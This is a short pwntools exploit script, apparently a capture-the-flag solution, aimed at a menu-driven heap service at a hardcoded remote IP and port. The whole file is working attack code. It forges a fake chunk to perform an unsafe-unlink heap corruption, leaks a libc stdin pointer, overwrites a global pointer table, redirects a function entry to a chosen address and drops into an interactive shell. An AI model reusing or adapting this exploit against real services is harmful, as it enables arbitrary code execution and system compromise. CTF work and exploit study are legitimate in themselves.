from pwn import *

#s = remote('192.168.32.236',1234)
s = remote('121.170.91.19', 2856)
def add(length, dat):
  s.recvuntil('>')
  s.sendline('1')
  s.recvuntil(':')
  s.sendline(str(length))
  s.recvuntil(':')
  s.send(dat)
def edit(index,length,dat):
  s.recvuntil('>')
  s.sendline('3')
  s.recvuntil(':')
  s.sendline(str(index))
  s.recvuntil(':')
  s.sendline(str(length))
  s.recvuntil(':')
  s.send(dat)
def remove(index):
  s.recvuntil('>')
  s.sendline('4')
  s.recvuntil(':')
  s.sendline(str(index))
def show():
  s.recvuntil('>')
  s.sendline('2')
add(0x100,'AAAA')
add(0x100,'BBBB')

dat = p64(0)+p64(0x0)
dat += p64(0x6020a8-0x18) + p64(0x6020a8-0x10)
dat += "A"*(0x100-0x8*4)
dat += p64(0x100)
dat += p64(0x110)
edit(0,len(dat),dat)
remove(1)
show()
stdin = u64(s.recvuntil('+')[-2-6:-2]+'\x00\x00')
dat = p64(stdin) + p64(0)
dat += p64(0x100) + p64(0x602060)
edit(0,len(dat),dat)
#edit(0,0x8,p64(0x602030))
time.sleep(0.3)
s.sendline('3')
time.sleep(0.3)
s.sendline('0')
time.sleep(0.3)
s.sendline('100')
time.sleep(0.3)
s.send(p64(0x04006C0))
s.interactive()
